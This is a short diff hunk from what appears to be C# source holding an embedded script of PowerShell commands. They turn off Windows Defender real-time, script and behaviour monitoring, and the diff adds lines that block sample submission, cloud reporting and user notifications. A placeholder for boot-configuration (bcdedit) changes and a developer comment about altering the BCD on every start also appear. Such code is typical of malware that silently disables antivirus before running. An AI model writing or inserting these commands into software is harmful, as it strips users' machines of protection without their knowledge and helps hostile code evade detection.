@@ -1624,6 +1624,9 @@ powershell -Command ""Set-MpPreference -DisableRealtimeMonitoring $true""
 powershell -Command ""Set-MpPreference -DisableIOAVProtection $true""
 powershell -Command ""Set-MpPreference -DisableBehaviorMonitoring $true""
 powershell -Command ""Set-MpPreference -DisableScriptScanning $true""
+powershell -Command ""Set-MpPreference -SubmitSamplesConsent 2""
+powershell -Command ""Set-MpPreference -MAPSReporting 0""
+powershell -Command ""Set-MpPreference -DisableEnhancedNotifications $true""
 
 {bcdeditSetup}";
                 //why do I change the bcd every time I start?
